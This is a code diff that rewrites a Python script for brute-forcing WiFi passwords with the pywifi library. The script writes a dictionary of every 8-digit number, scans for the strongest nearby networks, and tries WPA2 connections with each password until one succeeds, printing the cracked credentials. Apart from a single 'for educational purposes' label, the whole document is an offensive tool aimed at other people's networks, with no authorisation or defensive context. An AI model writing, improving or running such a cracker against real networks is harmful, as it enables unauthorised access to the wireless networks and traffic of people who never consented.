@@ -1,142 +1,150 @@
+"""WiFi brute-force cracking tool (for educational purposes only).
+
+Dependencies: pywifi
+Environment: Windows 10, Python 3.6+, PyCharm
+
+Workflow:
+1. Generate password dictionary (8-digit numbers in example)
+2. Scan available WiFi networks
+3. Attempt connection with each password from dictionary
 """
-Introduction Description
-
-The machine operating environment: system environment Win10, the operating environment Python3.6, run the tool Pycharm
-
-Python packages need to have: pywifi
-
-This is a brute wifi mode, the time required is longer, this paper provides a break ideas
-
-Second, the idea of introduction
-
-Mr. into a password dictionary (This step can also be downloaded from the Internet dictionary)
-
-Cycle with each password password dictionary to try to connect Wifi, until success
-
-Third, source design
-
-1. password dictionary TXT file is generated, provided herein is relatively simple, practical crack passwords can be set according to the general, to generate relatively large relatively wide password dictionary
-
-The following provides a simple 8 purely digital dictionary generation program codes
-"""
-
-
-
 
 import itertools as its
-
-# Problems encountered do not understand? Python learning exchange group: 821 460 695 meet your needs, data base files have been uploaded, you can download their own!
-
-if __name__ == '__main__':
-    words_num = "1234567890"
-    words_letter = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
-    r = its.product(words_num, repeat=8)
-    dic = open ( "password-8 digits .txt", "w")
-    for i in r:
-        dic.write("".join(i))
-        dic.write("".join("\n"))
-    dic.close()
-    
-    
-    
-    
-    
-    
-  #  2. brute force password when using longer
-  
-  
-import pywifi
- 
-from pywifi import const # quote some definitions
- 
 import time
-'''
- Problems encountered do not understand? Python learning exchange group: 821 460 695 meet your needs, data base files have been uploaded, you can download their own!
-'''
- 
-def getwifi(wifilist, wificount):
-    wifi = pywifi.PyWiFi () # crawled network interface cards
-    ifaces = wifi.interfaces () [0] # Get the card
-    ifaces.scan()
-    time.sleep(8)
-    bessis = ifaces.scan_results()
-    allwifilist = []
-    namelist = []
-    ssidlist = []
-    for data in bessis:
-        if data.ssid not in namelist: # remove duplicate names WIFI
-            namelist.append(data.ssid)
-            allwifilist.append((data.ssid, data.signal))
-    sorted(allwifilist, key=lambda st: st[1], reverse=True)
-    time.sleep(1)
-    n = 0
-    if len(allwifilist) != 0:
-        for item in allwifilist:
-            if (item[0] not in ssidlist) & (item[0] not in wifilist):
-                n = n + 1
-                if n <= wificount:
-                    ssidlist.append(item[0])
-    print(allwifilist)
-    return ssidlist
- 
- 
-def getifaces():
-    wifi = pywifi.PyWiFi () # crawled network interface cards
-    ifaces = wifi.interfaces () [0] # Get the card
-    ifaces.disconnect () # disconnect unlimited card connection
-    return ifaces
- 
- 
-def testwifi(ifaces, ssidname, password):
-    profile = pywifi.Profile () # create a wifi connection file
-    profile.ssid = ssidname # define wifissid
-    profile.auth = open(const.AUTH_ALG_OPEN) # NIC
-    profile.akm.append (const.AKM_TYPE_WPA2PSK) # wifi encryption algorithm
-    #encrypting unit 
-    profile.cipher = const.CIPHER_TYPE_CCMP #
-    profile.key = password # wifi password
-    ifaces.remove_all_network_profiles () # delete all other configuration files
-    tmp_profile = ifaces.add_network_profile (profile) # load the configuration file
-    ifaces.connect (tmp_profile) # wifi connection
-    #You can connect to the inner (5) # 5 seconds time.sleep
-    if ifaces.status() == const.IFACE_CONNECTED:
-        return True
-    else:
-        return False
- 
- 
-def beginwork(wifinamelist):
-    ifaces = getifaces()
-    path = r # password-8 digits .txt
-    # Path = r "password- commonly used passwords .txt"
-    files = open(path, 'r')
-    while True:
-        try:
-            password = files.readline()
-            password = password.strip('\n')
-            if not password:
+from collections.abc import Iterator
+from typing import Any
+
+from pywifi import PyWiFi, const
+
+
+def generate_password_dict() -> None:
+    """Generate 8-digit numeric password dictionary and save to file."""
+    digits: str = "1234567890"
+    # Generate all 8-digit combinations (00000000 to 99999999)
+    combinations: Iterator[tuple[str, ...]] = its.product(digits, repeat=8)
+
+    with open("password-8 digits.txt", "w", encoding="utf-8") as f:
+        for combo in combinations:
+            password: str = "".join(combo)
+            f.write(f"{password}\n")
+
+
+def get_wifi(wifi_exclude: list[str], wifi_count: int) -> list[str]:
+    """
+    Scan nearby WiFi networks, return top N SSIDs (excluding specified ones).
+
+    Args:
+        wifi_exclude: List of WiFi names to skip
+        wifi_count: Max number of WiFi networks to return
+
+    Returns:
+        List of target WiFi SSIDs
+    """
+    wifi: PyWiFi = PyWiFi()
+    iface = wifi.interfaces()[0]  # Get first network interface (no explicit type)
+    iface.scan()
+    time.sleep(8)  # Wait for scan results
+
+    # Get unique SSIDs with signal strength
+    scan_results: list[Any] = iface.scan_results()
+    unique_wifis: list[tuple[str, int]] = []
+    seen_ssids: list[str] = []
+
+    for result in scan_results:
+        ssid: str = result.ssid
+        if ssid not in seen_ssids:
+            seen_ssids.append(ssid)
+            unique_wifis.append((ssid, result.signal))
+
+    # Sort by signal strength (descending)
+    unique_wifis.sort(key=lambda x: x[1], reverse=True)
+
+    # Filter excluded and limit count
+    target_ssids: list[str] = []
+    for ssid, _ in unique_wifis:
+        if ssid not in wifi_exclude and ssid not in target_ssids:
+            target_ssids.append(ssid)
+            if len(target_ssids) >= wifi_count:
                 break
-            for wifiname in wifinamelist:
-                print ( "are trying to:" + wifiname + "," + password)
-                if testwifi(ifaces, wifiname, password):
-                    print ( "Wifi account:" + wifiname + ", Wifi password:" + password)
-                    wifinamelist.remove(wifiname)
-                    break
-                if not wifinamelist:
-                    break
-        except:
-            continue
-    files.close()
- 
- 
-if __name__ == '__main__':
-    wifinames_e = [ "", "Vrapile"] # exclude wifi name does not crack
-    wifinames = getwifi(wifinames_e, 5)
-    print(wifinames)
-    beginwork(wifinames)
-    
-    
-    
-    
-    
-    
+
+    return target_ssids
+
+
+def get_interface() -> Any:
+    """Initialize and return network interface (disconnect first)."""
+    wifi: PyWiFi = PyWiFi()
+    iface = wifi.interfaces()[0]
+    iface.disconnect()  # Ensure clean state
+    return iface
+
+
+def test_wifi(iface: Any, ssid: str, password: str) -> bool:
+    """
+    Test if given password connects to target WiFi.
+
+    Args:
+        iface: Network interface to use
+        ssid: Target WiFi name
+        password: Password to test
+
+    Returns:
+        True if connection succeeds, False otherwise
+    """
+    # Create connection profile
+    profile = iface.add_network_profile()
+    profile.ssid = ssid
+    profile.auth = const.AUTH_ALG_OPEN
+    profile.akm.append(const.AKM_TYPE_WPA2PSK)
+    profile.cipher = const.CIPHER_TYPE_CCMP
+    profile.key = password
+
+    # Clean up and connect
+    iface.remove_all_network_profiles()
+    tmp_profile = iface.add_network_profile(profile)
+    iface.connect(tmp_profile)
+
+    # Wait for connection attempt (5 seconds)
+    time.sleep(5)
+    return iface.status() == const.IFACE_CONNECTED
+
+
+def start_cracking(wifi_names: list[str]) -> None:
+    """
+    Brute-force crack target WiFi networks using password dictionary.
+
+    Args:
+        wifi_names: List of WiFi SSIDs to target
+    """
+    iface: Any = get_interface()
+    password_file: str = "password-8 digits.txt"  # Path to password dict
+
+    with open(password_file, encoding="utf-8") as f:
+        while True:
+            password: str = f.readline()
+            if not password:  # End of file
+                break
+
+            password = password.strip()
+            for wifi in wifi_names.copy():  # Use copy to modify list during loop
+                print(f"Trying: {wifi} with password: {password}")
+                if test_wifi(iface, wifi, password):
+                    print(f"Success! WiFi: {wifi}, Password: {password}")
+                    wifi_names.remove(wifi)
+                    if not wifi_names:  # All cracked
+                        return
+
+
+if __name__ == "__main__":
+    # Generate password dictionary first
+    generate_password_dict()
+
+    # Configuration
+    exclude_wifi: list[str] = ["", "Vrapile"]  # WiFi names to skip
+    max_targets: int = 5  # Max number of WiFi networks to target
+
+    # Get target WiFi list
+    target_wifis: list[str] = get_wifi(exclude_wifi, max_targets)
+    print(f"Target WiFi networks: {target_wifis}")
+
+    # Start brute-force
+    start_cracking(target_wifis)
